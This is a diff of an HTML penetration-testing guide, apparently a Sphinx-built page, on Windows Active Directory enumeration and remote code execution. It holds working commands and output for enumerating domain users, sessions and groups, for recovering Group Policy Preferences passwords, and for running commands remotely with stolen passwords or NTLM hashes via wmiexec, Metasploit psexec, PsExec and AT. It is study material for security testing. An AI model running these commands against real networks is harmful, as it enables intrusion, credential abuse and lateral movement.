+<span class="n">OU</span><span class="o">=</span><span class="n">Service</span> <span class="n">Accounts</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">abc</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">example</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">net</span>
+<span class="n">OU</span><span class="o">=</span><span class="n">Servers</span><span class="p">,</span><span class="n">OU</span><span class="o">=</span><span class="n">ABC</span><span class="o">-</span><span class="n">Admin</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">abc</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">example</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">net</span>
+<span class="n">DC</span><span class="o">=</span><span class="n">abc</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">example</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">net</span>
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>SERVER/ WORKSTATION: Queries the domain for the list of servers/ workstations</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="n">netdom</span> <span class="n">query</span> <span class="o">/</span><span class="n">domain</span> <span class="n">abc</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span> <span class="n">WORKSTATION</span>
+<span class="n">List</span> <span class="n">of</span> <span class="n">workstations</span> <span class="k">with</span> <span class="n">accounts</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">domain</span><span class="p">:</span>
+
+<span class="n">ABCDC02</span>      <span class="p">(</span> <span class="n">Workstation</span> <span class="ow">or</span> <span class="n">Server</span> <span class="p">)</span>
+<span class="n">ABCDC01</span>      <span class="p">(</span> <span class="n">Workstation</span> <span class="ow">or</span> <span class="n">Server</span> <span class="p">)</span>
+<span class="n">ABCDC03</span>      <span class="p">(</span> <span class="n">Workstation</span> <span class="ow">or</span> <span class="n">Server</span> <span class="p">)</span>
+<span class="n">ABCDC04</span>      <span class="p">(</span> <span class="n">Workstation</span> <span class="ow">or</span> <span class="n">Server</span> <span class="p">)</span>
+<span class="n">BSKMACDB62</span>   <span class="p">(</span> <span class="n">Workstation</span> <span class="ow">or</span> <span class="n">Server</span> <span class="p">)</span>
+
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+
+<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span>
+</pre></div>
+</div>
+</div></blockquote>
+</div>
+<div class="section" id="get-sessions-of-remote-machines">
+<h3>Get sessions of remote machines<a class="headerlink" href="#get-sessions-of-remote-machines" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li>Powerview Get-NetSession</li>
+<li>net session</li>
+</ul>
+<blockquote>
+<div><ul class="simple">
+<li>Net session of current computer</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">session</span>
+
+<span class="n">Computer</span>               <span class="n">User</span> <span class="n">name</span>            <span class="n">Client</span> <span class="n">Type</span>       <span class="n">Opens</span> <span class="n">Idle</span> <span class="n">time</span>
+
+<span class="o">-------------------------------------------------------------------------------</span>
+\\<span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>            <span class="n">Administrat0r</span>                              <span class="mi">1</span> <span class="mi">05</span><span class="n">D</span> <span class="mi">22</span><span class="n">H</span> <span class="mi">02</span><span class="n">M</span>
+
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Net session of remote computer</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">session</span> \\<span class="n">computername</span>
+</pre></div>
+</div>
+</div></blockquote>
+</div></blockquote>
+<ul class="simple">
+<li>Wmi: We can use wmi to get the remote logged on users. However, I believe to run wmi on remote machine, you need to be administrator of that machine.</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">wmic</span><span class="p">:</span><span class="n">root</span>\<span class="n">cli</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">node</span><span class="p">:</span><span class="s2">&quot;computername&quot;</span> <span class="n">path</span> <span class="n">win32_loggeduser</span> <span class="n">get</span> <span class="n">antecedent</span>
+
+\\<span class="o">.</span>\<span class="n">root</span>\<span class="n">cimv2</span><span class="p">:</span><span class="n">Win32_Account</span><span class="o">.</span><span class="n">Domain</span><span class="o">=</span><span class="s2">&quot;ABCROOT&quot;</span><span class="p">,</span><span class="n">Name</span><span class="o">=</span><span class="s2">&quot;adm.xxxxx&quot;</span>
+\\<span class="o">.</span>\<span class="n">root</span>\<span class="n">cimv2</span><span class="p">:</span><span class="n">Win32_Account</span><span class="o">.</span><span class="n">Domain</span><span class="o">=</span><span class="s2">&quot;ABCROOT&quot;</span><span class="p">,</span><span class="n">Name</span><span class="o">=</span><span class="s2">&quot;srv.xxxxx&quot;</span>
+\\<span class="o">.</span>\<span class="n">root</span>\<span class="n">cimv2</span><span class="p">:</span><span class="n">Win32_Account</span><span class="o">.</span><span class="n">Domain</span><span class="o">=</span><span class="s2">&quot;ABCROOT&quot;</span><span class="p">,</span><span class="n">Name</span><span class="o">=</span><span class="s2">&quot;adm.xxxxx&quot;</span>
+\\<span class="o">.</span>\<span class="n">root</span>\<span class="n">cimv2</span><span class="p">:</span><span class="n">Win32_Account</span><span class="o">.</span><span class="n">Domain</span><span class="o">=</span><span class="s2">&quot;EA&quot;</span><span class="p">,</span><span class="n">Name</span><span class="o">=</span><span class="s2">&quot;admd.xxxxx&quot;</span>
+\\<span class="o">.</span>\<span class="n">root</span>\<span class="n">cimv2</span><span class="p">:</span><span class="n">Win32_Account</span><span class="o">.</span><span class="n">Domain</span><span class="o">=</span><span class="s2">&quot;DC&quot;</span><span class="p">,</span><span class="n">Name</span><span class="o">=</span><span class="s2">&quot;ANONYMOUS LOGON&quot;</span>
+</pre></div>
+</div>
+</div></blockquote>
+</div>
+<div class="section" id="view-users-in-domain-workgroup">
+<h3>View users in Domain / Workgroup<a class="headerlink" href="#view-users-in-domain-workgroup" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li>Powerview Get-NetUser</li>
+<li>net user /domain</li>
+<li>wmi</li>
+</ul>
+<blockquote>
+<div><p>Domain users:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">wmic</span> <span class="n">useraccount</span> <span class="nb">list</span> <span class="o">/</span><span class="nb">format</span><span class="p">:</span><span class="nb">list</span>
+</pre></div>
+</div>
+</div></blockquote>
+</div>
+<div class="section" id="view-machines-in-domain-workgroup">
+<h3>View machines in Domain/ Workgroup<a class="headerlink" href="#view-machines-in-domain-workgroup" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li>Powerview Get-NetComputers</li>
+<li>net view /domain ? &#8211; check the functionality</li>
+<li>View machines affected by GPP vulnerability</li>
+</ul>
+<blockquote>
+<div><p>When we run Get-GPPPassword, we get output like</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Password</span><span class="p">:</span> <span class="n">password</span><span class="nd">@123</span>
+<span class="n">Changed</span> <span class="p">:</span> <span class="mi">2013</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">02</span> <span class="mi">01</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">23</span>
+<span class="n">Username</span><span class="p">:</span> <span class="n">Administrator</span>
+<span class="n">NewName</span> <span class="p">:</span>
+<span class="n">File</span>    <span class="p">:</span> \\<span class="n">Demo</span><span class="o">.</span><span class="n">lab</span>\<span class="n">sysvol</span>\<span class="n">demo</span><span class="o">.</span><span class="n">lab</span>\<span class="n">Policies</span>\<span class="p">{</span><span class="mi">31</span><span class="n">B2F340</span><span class="o">-</span><span class="mi">016</span><span class="n">D</span><span class="o">-</span><span class="mi">11</span><span class="n">D2</span><span class="o">-</span><span class="mi">945</span><span class="n">F</span><span class="o">-</span><span class="mi">00</span><span class="n">C04FB984F9</span><span class="p">}</span>\<span class="n">MACHINE</span>\<span class="n">Preferences</span>\<span class="n">DataSources</span>\<span class="p">{</span><span class="n">DataSouces</span><span class="o">|</span> <span class="n">Groups</span><span class="o">|</span> <span class="n">ScheduledTasks</span><span class="o">.</span><span class="n">xml</span>
+</pre></div>
+</div>
+<p>To get the computers using the passwords set by the GPP, we can use</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>Get-NetOU -GUID &quot;{31B2F340-016D-11D2-945F-00C04FB984F9}&quot; | %{ Get-NetComputer -ADSPath $_ }
+</pre></div>
+</div>
+<p>Get-NetSite function, which returns the current sites for a domain, also accepts the -GUID filtering flag. This information has been taken from harmj0y blog <a class="reference external" href="http://www.harmj0y.net/blog/powershell/gpp-and-powerview/">gpp and powerview</a></p>
+</div></blockquote>
+</div>
+<div class="section" id="view-group-in-domain-workgroup">
+<h3>View group in Domain / Workgroup<a class="headerlink" href="#view-group-in-domain-workgroup" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li>Powerview Get-NetGroupMember</li>
+<li>Net group / domain? options</li>
+<li>Windows Resource Kit Local/ Global executable</li>
+</ul>
+<blockquote>
+<div><ul class="simple">
+<li>Global.exe</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="o">.</span>\<span class="k">global</span><span class="o">.</span><span class="n">exe</span>
+
+<span class="n">Displays</span> <span class="n">members</span> <span class="n">of</span> <span class="k">global</span> <span class="n">groups</span> <span class="n">on</span> <span class="n">remote</span> <span class="n">servers</span> <span class="ow">or</span> <span class="n">domains</span><span class="o">.</span>
+
+<span class="n">GLOBAL</span> <span class="n">group_name</span> <span class="n">domain_name</span> <span class="o">|</span> \\<span class="n">server</span>
+
+<span class="n">group_name</span>    <span class="n">The</span> <span class="n">name</span> <span class="n">of</span> <span class="n">the</span> <span class="k">global</span> <span class="n">group</span> <span class="n">to</span> <span class="nb">list</span> <span class="n">the</span> <span class="n">members</span> <span class="n">of</span><span class="o">.</span>
+<span class="n">domain_name</span>   <span class="n">The</span> <span class="n">name</span> <span class="n">of</span> <span class="n">a</span> <span class="n">network</span> <span class="n">domain</span><span class="o">.</span>
+\\<span class="n">server</span>      <span class="n">The</span> <span class="n">name</span> <span class="n">of</span> <span class="n">a</span> <span class="n">network</span> <span class="n">server</span><span class="o">.</span>
+
+<span class="n">Examples</span><span class="p">:</span>
+<span class="n">Global</span> <span class="s2">&quot;Domain Users&quot;</span> <span class="n">EastCoast</span>
+<span class="n">Displays</span> <span class="n">the</span> <span class="n">members</span> <span class="n">of</span> <span class="n">the</span> <span class="n">group</span> <span class="s1">&#39;Domain Users&#39;</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">EastCoast</span> <span class="n">domain</span><span class="o">.</span>
+
+<span class="n">Global</span> <span class="n">PrintUsers</span> \\<span class="n">BLACKCAT</span>
+<span class="n">Displays</span> <span class="n">the</span> <span class="n">members</span> <span class="n">of</span> <span class="n">the</span> <span class="n">group</span> <span class="n">PrintUsers</span> <span class="n">on</span> <span class="n">server</span> <span class="n">BLACKCAT</span><span class="o">.</span>
+
+<span class="n">Notes</span><span class="p">:</span>
+<span class="n">Names</span> <span class="n">that</span> <span class="n">include</span> <span class="n">space</span> <span class="n">characters</span> <span class="n">must</span> <span class="n">be</span> <span class="n">enclosed</span> <span class="ow">in</span> <span class="n">double</span> <span class="n">quotes</span><span class="o">.</span>
+<span class="n">To</span> <span class="nb">list</span> <span class="n">members</span> <span class="n">of</span> <span class="n">local</span> <span class="n">groups</span> <span class="n">use</span> <span class="n">Local</span><span class="o">.</span><span class="n">Exe</span><span class="o">.</span>
+<span class="n">To</span> <span class="n">get</span> <span class="n">the</span> <span class="n">Server</span> <span class="n">name</span> <span class="k">for</span> <span class="n">a</span> <span class="n">give</span> <span class="n">Domain</span> <span class="n">use</span> <span class="n">GetDC</span><span class="o">.</span><span class="n">Exe</span><span class="o">.</span>
+</pre></div>
+</div>
+<p>Example:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="o">.</span>\<span class="k">global</span><span class="o">.</span><span class="n">exe</span> <span class="s2">&quot;Domain Admins&quot;</span> \\<span class="n">domainname</span>
+<span class="n">Uraxxxx</span>
+<span class="n">adm</span><span class="o">.</span><span class="n">xxxxx</span>
+<span class="n">adm</span><span class="o">.</span><span class="n">xxxxx2</span>
+<span class="n">adm</span><span class="o">.</span><span class="n">xxxxxx3</span>
+</pre></div>
+</div>
+</div></blockquote>
+</div></blockquote>
+<ul class="simple">
+<li>BloodHound Group Memberships</li>
+<li>wmi user groups</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">wmic</span> <span class="n">group</span> <span class="nb">list</span> <span class="n">brief</span>
+<span class="n">ABCD</span>\<span class="n">SUS</span> <span class="n">Administrator</span>    <span class="n">ABCD</span>          <span class="n">SUS</span> <span class="n">Administrator</span>                                         <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="n">XXXXXXXXX</span><span class="o">-</span><span class="n">XXXXXXXXX</span><span class="o">-</span><span class="n">XXXXXXXXX</span><span class="o">-</span><span class="mi">7357</span>
+<span class="n">ABCD</span>\<span class="n">VPN</span> <span class="n">Admins</span>           <span class="n">ABCD</span>          <span class="n">VPN</span> <span class="n">Admins</span>                                                <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="n">XXXXXXXXX</span><span class="o">-</span><span class="n">XXXXXXXXX</span><span class="o">-</span><span class="n">XXXXXXXXX</span><span class="o">-</span><span class="mi">8728</span>
+<span class="n">ABCD</span>\<span class="n">VPN</span> <span class="n">Users</span>            <span class="n">ABCD</span>          <span class="n">VPN</span> <span class="n">Users</span>                                                 <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="n">XXXXXXXXX</span><span class="o">-</span><span class="n">XXXXXXXXX</span><span class="o">-</span><span class="n">XXXXXXXXX</span><span class="o">-</span><span class="mi">9229</span>
+<span class="n">ABCD</span>\<span class="n">XXX</span> <span class="o">-</span> <span class="n">OER</span> <span class="n">Users</span>      <span class="n">ABCD</span>          <span class="n">XXX</span> <span class="o">-</span> <span class="n">OER</span> <span class="n">Users</span>                                           <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="n">XXXXXXXXX</span><span class="o">-</span><span class="n">XXXXXXXXX</span><span class="o">-</span><span class="n">XXXXXXXXX</span><span class="o">-</span><span class="mi">5095</span>
+</pre></div>
+</div>
+</div></blockquote>
+</div>
+</div>
 <div class="section" id="remote-code-execution-methods">
 <h2>Remote Code Execution Methods:<a class="headerlink" href="#remote-code-execution-methods" title="Permalink to this headline">¶</a></h2>
-<p>A lot of details for Remote Code execution has already been mentioned by Rop Nop in his three parts <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">Part 1: Using credentials to own windows boxes</a> , <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/">Part2: PSExec and Services</a> and <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/">Part: 3 Wmi and WinRM</a></p>
+<p>A lot of details for Remote Code execution has already been mentioned by Rop Nop in his three parts <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">Part 1: Using credentials to own windows boxes</a> , <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/">Part2: PSExec and Services</a> and <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/">Part: 3 Wmi and WinRM</a> and by scriptjunkie in his blog <a class="reference external" href="https://www.scriptjunkie.us/2013/02/authenticated-remote-code-execution-methods-in-windows/">Authenticated Remote Code Execution Methods in Windows</a></p>
+<p>We have just summarized all in one page with <em>working</em> examples whereever possible.</p>
 <div class="section" id="winexe">
 <h3>Winexe<a class="headerlink" href="#winexe" title="Permalink to this headline">¶</a></h3>
 <ul class="simple">
@@ -325,7 +773,37 @@ C:\Windows\system32&gt;
 <li>Impacket wmiexec</li>
 </ul>
 <blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>wmiexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mf">9.15</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2002</span><span class="o">-</span><span class="mi">2016</span> <span class="n">Core</span> <span class="n">Security</span> <span class="n">Technologies</span>
+
+<span class="n">usage</span><span class="p">:</span> <span class="n">wmiexec</span><span class="o">.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">share</span> <span class="n">SHARE</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">nooutput</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">debug</span><span class="p">]</span>
+                  <span class="p">[</span><span class="o">-</span><span class="n">hashes</span> <span class="n">LMHASH</span><span class="p">:</span><span class="n">NTHASH</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">k</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">aesKey</span> <span class="nb">hex</span> <span class="n">key</span><span class="p">]</span>
+                  <span class="p">[</span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">ip</span> <span class="n">address</span><span class="p">]</span>
+                  <span class="n">target</span> <span class="p">[</span><span class="n">command</span> <span class="p">[</span><span class="n">command</span> <span class="o">...</span><span class="p">]]</span>
+
+<span class="n">Executes</span> <span class="n">a</span> <span class="n">semi</span><span class="o">-</span><span class="n">interactive</span> <span class="n">shell</span> <span class="n">using</span> <span class="n">Windows</span> <span class="n">Management</span> <span class="n">Instrumentation</span><span class="o">.</span>
+
+<span class="n">positional</span> <span class="n">arguments</span><span class="p">:</span>
+  <span class="n">target</span>                <span class="p">[[</span><span class="n">domain</span><span class="o">/</span><span class="p">]</span><span class="n">username</span><span class="p">[:</span><span class="n">password</span><span class="p">]</span><span class="o">@</span><span class="p">]</span><span class="o">&lt;</span><span class="n">targetName</span> <span class="ow">or</span> <span class="n">address</span><span class="o">&gt;</span>
+  <span class="n">command</span>               <span class="n">command</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">at</span> <span class="n">the</span> <span class="n">target</span><span class="o">.</span> <span class="n">If</span> <span class="n">empty</span> <span class="n">it</span> <span class="n">will</span>
+                        <span class="n">launch</span> <span class="n">a</span> <span class="n">semi</span><span class="o">-</span><span class="n">interactive</span> <span class="n">shell</span>
+
+<span class="n">authentication</span><span class="p">:</span>
+  <span class="o">-</span><span class="n">hashes</span> <span class="n">LMHASH</span><span class="p">:</span><span class="n">NTHASH</span>
+                        <span class="n">NTLM</span> <span class="n">hashes</span><span class="p">,</span> <span class="nb">format</span> <span class="ow">is</span> <span class="n">LMHASH</span><span class="p">:</span><span class="n">NTHASH</span>
+  <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span>              <span class="n">don</span><span class="s1">&#39;t ask for password (useful for -k)</span>
+  <span class="o">-</span><span class="n">k</span>                    <span class="n">Use</span> <span class="n">Kerberos</span> <span class="n">authentication</span><span class="o">.</span> <span class="n">Grabs</span> <span class="n">credentials</span> <span class="kn">from</span>
+                        <span class="nn">ccache</span> <span class="n">file</span> <span class="p">(</span><span class="n">KRB5CCNAME</span><span class="p">)</span> <span class="n">based</span> <span class="n">on</span> <span class="n">target</span> <span class="n">parameters</span><span class="o">.</span>
+                        <span class="n">If</span> <span class="n">valid</span> <span class="n">credentials</span> <span class="n">cannot</span> <span class="n">be</span> <span class="n">found</span><span class="p">,</span> <span class="n">it</span> <span class="n">will</span> <span class="n">use</span> <span class="n">the</span>
+                        <span class="n">ones</span> <span class="n">specified</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">command</span> <span class="n">line</span>
+  <span class="o">-</span><span class="n">aesKey</span> <span class="nb">hex</span> <span class="n">key</span>       <span class="n">AES</span> <span class="n">key</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> <span class="n">Kerberos</span> <span class="n">Authentication</span> <span class="p">(</span><span class="mi">128</span> <span class="ow">or</span> <span class="mi">256</span>
+                        <span class="n">bits</span><span class="p">)</span>
+  <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">ip</span> <span class="n">address</span>     <span class="n">IP</span> <span class="n">Address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">domain</span> <span class="n">controller</span><span class="o">.</span> <span class="n">If</span> <span class="n">ommited</span> <span class="n">it</span> <span class="n">use</span>
+                        <span class="n">the</span> <span class="n">domain</span> <span class="n">part</span> <span class="p">(</span><span class="n">FQDN</span><span class="p">)</span> <span class="n">specified</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">target</span>
+                        <span class="n">parameter</span>
+</pre></div>
+</div>
+<p>Example with password:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>wmiexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180
 
 Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 
@@ -346,11 +824,15 @@ xxxxhbks1739\administrat0r
 C:\&gt;
 </pre></div>
 </div>
+<p>Example with hashes:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">wmiexec</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">debug</span> <span class="o">-</span><span class="n">hashes</span> <span class="n">xxxxxxxxxxxxxx</span><span class="p">:</span><span class="n">xxxxxxx</span>  <span class="n">Administrat0r</span><span class="nd">@10</span><span class="o">.</span><span class="mf">0.5</span><span class="o">.</span><span class="mi">180</span>
+</pre></div>
+</div>
 </div></blockquote>
 </div>
 <div class="section" id="metasploit-psexec">
 <h3>Metasploit psexec<a class="headerlink" href="#metasploit-psexec" title="Permalink to this headline">¶</a></h3>
-<p>Metasploit psexec have three methods to invoke, Let&#8217;s first try with target 2: Native upload</p>
+<p>Metasploit psexec have three methods to invoke,</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">psexec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">targets</span>
 
 <span class="n">Exploit</span> <span class="n">targets</span><span class="p">:</span>
@@ -363,6 +845,7 @@ C:\&gt;
  <span class="mi">3</span>   <span class="n">MOF</span> <span class="n">upload</span>
 </pre></div>
 </div>
+<p>Let&#8217;s first try with target 2: Native upload</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">psexec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">target</span> <span class="mi">2</span>
 <span class="n">target</span> <span class="o">=&gt;</span> <span class="mi">2</span>
 
@@ -430,270 +913,149 @@ meterpreter &gt;
 </div>
 <div class="section" id="sysinternals-psexec">
 <h3>Sysinternals psexec<a class="headerlink" href="#sysinternals-psexec" title="Permalink to this headline">¶</a></h3>
+<p>Microsoft Sysinternal tool psexec can be downloaded from <a class="reference external" href="https://technet.microsoft.com/en-us/sysinternals/pxexec.aspx">PsExec</a>. Mark has written a good article on how psexec works is <a class="reference external" href="http://windowsitpro.com/systems-management/psexec">PsExec Working</a>.</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">psexec</span><span class="o">.</span><span class="n">exe</span> \\<span class="n">Computername</span> <span class="o">-</span><span class="n">u</span> <span class="n">DomainName</span>\<span class="n">username</span> <span class="o">-</span><span class="n">p</span> <span class="n">password</span> <span class="o">&lt;</span><span class="n">command</span><span class="o">&gt;</span>
+<span class="n">command</span> <span class="n">can</span> <span class="n">be</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span><span class="o">/</span> <span class="n">ipconfig</span> <span class="n">etc</span><span class="o">.</span>
+</pre></div>
+</div>
 </div>
 <div class="section" id="smbclient">
 <h3>smbclient:<a class="headerlink" href="#smbclient" title="Permalink to this headline">¶</a></h3>
+<p>Yet to run:</p>
 </div>
-<div class="section" id="rpclient">
-<h3>rpclient<a class="headerlink" href="#rpclient" title="Permalink to this headline">¶</a></h3>
-<blockquote>
-<div>eskoudis presents great amount of information at <a class="reference external" href="https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions">Plundering Windows Account Infor via Authenticated SMB Session</a>
-carnal0wnage have written <a class="reference external" href="http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html">Enumerating user accounts on linux and OSX</a>
-and BlackHills have written <a class="reference external" href="http://www.blackhillsinfosec.com/?p=4645">Password Spraying and Other Fun with RPC Client</a>  Most of the stuff has been taken from the above three.</div></blockquote>
-<ul class="simple">
-<li>Connection:</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="n">xxxxs</span><span class="o">.</span><span class="n">hxxxx</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">mlxxxxh</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">65.103</span>
+<div class="section" id="task-scheduler">
+<h3>Task Scheduler<a class="headerlink" href="#task-scheduler" title="Permalink to this headline">¶</a></h3>
+<p>If you are the administrator of the remote machine and using runas /netonly, we can utilize AT to run commands remotely. Using AT, a command to be run at designated time(s) as SYSTEM.</p>
+<p>Example:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">AT</span> \\<span class="n">REMOTECOMPUTERNAME</span> <span class="mi">12</span><span class="p">:</span><span class="mi">34</span> <span class="s2">&quot;command to run&quot;</span>
 </pre></div>
 </div>
-</div></blockquote>
-<ul class="simple">
-<li>Version of the target Windows machine:</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; srvinfo
-10.0.65.103    Wk Sv BDC Tim NT
-platform_id     :       500
-os version      :       6.3
-server type     :       0x801033
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>enum commands:</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; enum
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">AT</span> \\<span class="n">REMOTECOMPUTERNAME</span> <span class="mi">12</span><span class="p">:</span><span class="mi">34</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span> \<span class="n">c</span> <span class="s2">&quot;command to run&quot;</span>
 
-enumalsgroups  enumdomains    enumdrivers    enumkey     enumprivs
-enumdata       enumdomgroups  enumforms      enumports   enumtrust
-enumdataex     enumdomusers   enumjobs       enumprinter
+<span class="s2">&quot;command to run&quot;</span> <span class="n">can</span> <span class="n">be</span> <span class="n">web</span><span class="o">-</span><span class="n">delivery</span> <span class="n">string</span> <span class="ow">or</span> <span class="n">powershell</span> <span class="n">empire</span> <span class="n">string</span><span class="o">.</span>
 </pre></div>
 </div>
-</div></blockquote>
-<ul class="simple">
-<li>Tell the current domain</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">enumdomains</span>
-<span class="n">name</span><span class="p">:[</span><span class="n">xxxx</span><span class="p">]</span> <span class="n">idx</span><span class="p">:[</span><span class="mh">0x0</span><span class="p">]</span>
-<span class="n">name</span><span class="p">:[</span><span class="n">Builtin</span><span class="p">]</span> <span class="n">idx</span><span class="p">:[</span><span class="mh">0x0</span><span class="p">]</span>
+<p>If we need to delete the AT jobs, we can use</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">AT</span> \\<span class="n">REMOTECOMPUTERNAME</span> <span class="nb">id</span> <span class="o">/</span><span class="n">delete</span> <span class="o">/</span><span class="n">yes</span>
 </pre></div>
 </div>
-</div></blockquote>
-<ul class="simple">
-<li>Enum Domain info</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; querydominfo
-Domain:               xxxx
-Server:               HMC_PDC-TEMP
-Comment:
-Total Users:  9043
-Total Groups: 0
-Total Aliases:        616
-Sequence No:  1
-Force Logoff: -1
-Domain Server State:  0x1
-Server Role:  ROLE_DOMAIN_BDC
-Unknown 3:    0x1
+<p>However, sometimes doing it remotely, we need to figure out the time of the remote computer, we can utilize NET TIME</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">NET</span> <span class="n">TIME</span> \\<span class="n">REMOTECOMPUTERNAME</span>
 </pre></div>
 </div>
-</div></blockquote>
-<ul>
